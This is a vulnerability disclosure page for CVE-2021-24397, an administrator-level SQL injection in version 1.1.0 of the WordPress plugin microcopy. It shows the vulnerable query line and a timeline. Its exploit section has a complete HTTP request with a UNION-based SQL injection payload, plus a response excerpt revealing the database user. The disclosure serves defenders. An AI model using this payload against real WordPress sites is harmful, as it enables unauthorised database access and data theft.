<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : microcopy | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Microcopy</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/microcopy/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : microcopy</a></div>
<div>Effected Version : 1.1.0 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Administrator</div>
<div>CVE Number : CVE-2021-24397</div>
<div>Identified by : <a href="/author/syed_sheeraz_ali/">Syed Sheeraz Ali</a></div>
<div><a href="https://wpscan.com/plugin/microcopy/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>May 9, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	May 13, 2021 : Plugin  Closed</li>
	
	
	<li>June 10, 2021 : CVE Assigned</li>
	
	<li>August 22, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>Vulnerable File: <code>/microcopy/trunk/detail.php#6</code></p>
<p>Administrator level SQLi for parameter <code>id</code> <a href="https://plugins.trac.wordpress.org/browser/microcopy/trunk/detail.php#6" target="_blank" rel="noreferrer noopener nofollow">detail.php#6</a>
</p>
<pre><code>6:		$option = $wpdb-&gt;get_row(&quot;SELECT * FROM &quot; . $wpdb-&gt;prefix . &quot;options WHERE option_id = &quot; . $this-&gt;id ); 
</code></pre><h2 id="poc-screenshots">PoC Screenshots</h2>
<p><img src="/disclosure_screenshots/microcopy_screenshot1.png" alt="screenshot 1">
<img src="/disclosure_screenshots/microcopy_screenshot2.png" alt="screenshot 2"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>GET /wp-admin/admin.php?page=microcopy%2Fdetail.php&amp;action=edit&amp;id=-5617 UNION ALL SELECT 1,2,user(),3 HTTP/1.1
Host: gbkbypass.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_3c2ce95e14731d39dda94160e7e8239e=admin%7C1620020442%7CixfDwfnsIBAn1ow0fTTBvdz3sMbGUlhBGnoinldBgYj%7Cfadfb0c9b05039426d0621b93138db69324a5487b73b811969813ee92f76d680; wp-settings-1=unfold%3D1%26mfold%3Do; wp-settings-time-1=1619679787; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3AMdwjdLIAddwLk2EW2hku1RVy; PHPSESSID=did03hufl7mqut9v942lljoj2k; googtrans=/en/en; googtrans=/en/en; _chatuser=792211; wordpress_logged_in_3c2ce95e14731d39dda94160e7e8239e=admin%7C1620020442%7CixfDwfnsIBAn1ow0fTTBvdz3sMbGUlhBGnoinldBgYj%7Cc5f8189b3a29ac07187567110b8caab826a3e0ebbc0f96a6ce5d9cde21a88b5c
Connection: close
</code></pre><pre><code>&lt;/div&gt;
&lt;div id=&quot;wp-content-editor-container&quot; class=&quot;wp-editor-container&quot;&gt;&lt;div id=&quot;qt_content_toolbar&quot; class=&quot;quicktags-toolbar&quot;&gt;&lt;/div&gt;&lt;textarea class=&quot;wp-editor-area&quot; rows=&quot;20&quot; autocomplete=&quot;off&quot; cols=&quot;40&quot; name=&quot;content&quot; id=&quot;content&quot;&gt;bob@localhost&lt;/textarea&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

